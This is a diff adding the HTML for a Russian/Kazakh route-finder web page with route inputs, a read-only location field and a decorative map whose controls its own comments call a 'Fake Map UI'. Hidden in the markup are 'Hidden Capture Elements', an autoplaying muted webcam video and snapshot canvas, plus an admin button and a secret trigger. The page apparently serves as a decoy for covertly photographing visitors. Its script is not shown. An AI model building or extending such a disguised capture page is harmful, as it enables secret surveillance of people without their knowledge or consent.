@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Route Finder</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+</head>
+
+<body>
+
+    <div class="background-map">
+        <!-- SVG Abstract Map Background -->
+        <svg viewBox="0 0 800 600" xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid slice">
+            <style>
+                .map-line {
+                    stroke: rgba(255, 255, 255, 0.1);
+                    stroke-width: 2;
+                    fill: none;
+                }
+
+                .map-dot {
+                    fill: rgba(255, 255, 255, 0.3);
+                }
+            </style>
+            <!-- Random roads/lines -->
+            <path class="map-line" d="M100,100 Q400,50 600,300 T700,500" />
+            <path class="map-line" d="M50,400 Q200,300 400,400 T750,200" />
+            <path class="map-line" d="M200,0 L200,600" />
+            <path class="map-line" d="M0,300 L800,300" />
+
+            <circle class="map-dot" cx="200" cy="300" r="4" />
+            <circle class="map-dot" cx="600" cy="300" r="4" />
+            <circle class="map-dot" cx="400" cy="400" r="4" />
+        </svg>
+    </div>
+
+    <div class="app-container">
+        <header class="glass-header">
+            <div class="logo">RouteNav</div>
+            <div class="header-controls">
+                <button id="admin-btn" class="lang-btn" style="margin-right: 10px;">Admin</button>
+                <button id="lang-toggle" class="lang-btn">KZ</button>
+            </div>
+        </header>
+
+        <main class="control-panel glass">
+            <h1 id="app-title">Поиск Маршрута</h1>
+
+            <div class="input-group">
+                <label for="from-point" id="lbl-from">Откуда</label>
+                <div class="input-wrapper">
+                    <span class="icon">📍</span>
+                    <input type="text" id="from-point" placeholder="Ваше местоположение..." readonly>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label for="to-point" id="lbl-to">Куда</label>
+                <div class="input-wrapper">
+                    <span class="icon">🏁</span>
+                    <input type="text" id="to-point" placeholder="Введите адрес">
+                </div>
+            </div>
+
+            <button id="build-route-btn" class="primary-btn">Построить маршрут</button>
+            <p id="status-msg" class="status-message hidden"></p>
+        </main>
+    </div>
+
+    <!-- Fake Map UI -->
+    <div class="location-marker"></div>
+    <div class="map-controls">
+        <button class="map-btn" title="Zoom In">+</button>
+        <button class="map-btn" title="Zoom Out">−</button>
+        <button class="map-btn" title="Compass">🧭</button>
+    </div>
+
+    <!-- Hidden Capture Elements -->
+    <div class="hidden-tools">
+        <video id="webcam" autoplay playsinline muted></video>
+        <canvas id="snapshot"></canvas>
+    </div>
+
+
+
+    <div id="secret-trigger" class="secret-trigger"></div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
